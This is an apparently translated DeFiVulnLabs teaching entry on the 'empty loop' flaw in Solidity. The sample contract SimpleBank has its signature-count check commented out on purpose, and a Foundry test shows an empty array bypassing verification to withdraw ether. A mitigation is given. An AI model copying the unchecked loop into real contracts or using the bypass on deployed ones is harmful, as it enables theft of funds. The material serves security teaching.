[empty-loop.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/empty-loop.sol)

# 空循环

**名称：** 空循环问题

**说明：** 由于验证不充分，攻击者可以简单地传递一个空数组来绕过循环和签名验证。

**减轻：**

检查签名数量 require(sigs.length > 0, "未提供签名");

**参考：**

https://twitter.com/1nf0s3cpt/status/1673195574215213057

https://twitter.com/akshaysrivastv/status/1648310441058115592

https://dacian.me/exploiting-developer-assumptions#heading-unexpected-empty-inputs

**SimpleBank 合约样例:**

```jsx
contract SimpleBank {
    struct Signature {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function verifySignatures(Signature calldata sig) public {
        require(
            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
            "Invalid signature"
        );
    }

    function withdraw(Signature[] calldata sigs) public {
        // 措施：检查签名数量
        //请求(sigs.length > 0, "No signatures provided");
        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];
            // 验证每个签名，如果其中任何一个签名验证失败，则恢复。
            verifySignatures(signature);
        }
        payable(msg.sender).transfer(1 ether);
    }

    receive() external payable {}
}
```

***\*测试方法:\****

forge test --contracts src/test/**empty-loop.sol** -vvvv

```jsx
// 测试与签名验证相关的漏洞的函数
    function testVulnSignatureValidation() public {
        // 将 10 以太币转移到 SimpleBankContract
        payable(address(SimpleBankContract)).transfer(10 ether);
        
        // Alice的地址被设置为虚拟机中的第一个地址
        address alice = vm.addr(1);
        
        // 在虚拟机中对 Alice 的帐户发起“恶作剧”
        vm.startPrank(alice);

        // 从 SimpleBank 合约初始化 Signature 结构的空数组
        SimpleBank.Signature[] memory sigs = new SimpleBank.Signature[](0); // empty input

        // 在利用之前记录 Alice 的余额
        console.log(
            "Before exploiting, Alice's ether balance",
            address(alice).balance
        );
        
        // 以空签名数组为参数，调用SimpleBank合约的提现函数
         // 如果 SimpleBank 合约没有正确验证签名，这可能会导致未经授权的提款
        SimpleBankContract.withdraw(sigs); 

        //记录 Alice 在漏洞利用后的余额
        console.log(
            "Afer exploiting, Alice's ether balance",
            address(alice).balance
        );
    }
```

**红色框：传递一个空数组以绕过验证。**

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0c65504d-c3f1-4ee1-b088-76f631784fb3%2FUntitled.png?table=block&id=aa602a09-ccf5-4348-87dd-8ae494f92e4c&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)